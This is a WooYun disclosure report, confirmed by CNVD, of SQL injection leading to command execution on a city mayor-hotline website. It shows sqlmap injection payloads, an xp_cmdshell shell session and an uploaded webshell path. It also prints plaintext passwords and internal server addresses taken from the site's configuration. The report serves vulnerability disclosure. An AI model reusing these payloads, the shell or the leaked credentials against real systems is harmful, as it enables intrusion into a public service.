wybug_title: 某市市长热线sql注入getshell内网
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-08-04：	细节已通知厂商并且等待厂商处理中									2015-08-07：	厂商已经确认，细节仅向厂商公开									2015-08-17：	细节向核心白帽子及相关领域专家公开									2015-08-27：	细节向普通白帽子公开									2015-09-06：	细节向实习白帽子公开									2015-09-21：	细节向公众公开  简要描述： 注入 弱口令 getshell 内网  详细说明：  http://www.961890.gov.cn/content/NewsPaperInfo.aspx?PolicyWorkSn=1312
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: PolicyWorkSn (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PolicyWorkSn=1312 AND 6459=6459    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: PolicyWorkSn=1312;WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: PolicyWorkSn=-5834 UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(97)+CHAR(88)+CHAR(71)+CHAR(88)+CHAR(112)+CHAR(72)+CHAR(97)+CHAR(73)+CHAR(78)+CHAR(107)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL-----[13:48:03] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 8.1 or 2012 R2web application technology: ASP.NET, Microsoft IIS 8.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[13:48:03] [INFO] testing if current user is DBA[13:48:33] [INFO] testing if xp_cmdshell extended procedure is usable[13:48:33] [INFO] the SQL query used returns 1 entries[13:48:33] [INFO] retrieved: 1[13:48:34] [INFO] xp_cmdshell extended procedure is usable[13:48:34] [INFO] going to use xp_cmdshell extended procedure for operating system command execution[13:48:34] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
但是没什么用,什么工具上去都不兼容 XCAN扫了下发现开了端口443 https://60.8.63.244

随后看了"试用帮助"以及"培训课件" 

上传没有过滤 丢了个shell上去https://60.8.63.244/AppendixManage/ss.aspx adminD:\DSLX_App\QHD_12345(https)\Web.config<!--BEGIN 设置SSRS报表服务器URL地址-->		<add key="SSRS_URL" value="http://192.168.20.32/reportserver"/>		<add key="SSRS_Name" value="administrator"/>		<add key="SSRS_Password" value="admin@123"/>获得口令一枚 SQLSERVER<add name="dslx_cc_cc12345ConnectionString" connectionString="Data Source=192.168.20.22\IPCC;Initial Catalog=DSLX_CC_ZJK961890;Persist Security Info=True;User ID=sa;Password=123456Rq" providerName="System.Data.SqlClient"/>        <add name="CCSR_T_ConnectionString" connectionString="Data Source=10.213.67.105;Initial Catalog=CCSR_T_QHD;Persist Security Info=True;User ID=sa;Password=dsideal12345+-*/" providerName="System.Data.SqlClient"/>SQL连接信息外网不同端口映射的内网不通服务器aspshellportmap    漏洞证明：  
[13:48:03] [INFO] testing if current user is DBA[13:48:33] [INFO] testing if xp_cmdshell extended procedure is usable[13:48:33] [INFO] the SQL query used returns 1 entries[13:48:33] [INFO] retrieved: 1[13:48:34] [INFO] xp_cmdshell extended procedure is usable[13:48:34] [INFO] going to use xp_cmdshell extended procedure for operating system command execution[13:48:34] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTERos-shell> whoamido you want to retrieve the command standard output? [Y/n/a][14:07:19] [INFO] the SQL query used returns 1 entries[14:07:19] [INFO] retrieved: win-6g2k06l0qlc\\\\administratorcommand standard output [1]:[*] win-6g2k06l0qlc\administrator




不再深入   修复方案：  增强安全意识   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-07 09:30 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给河北分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
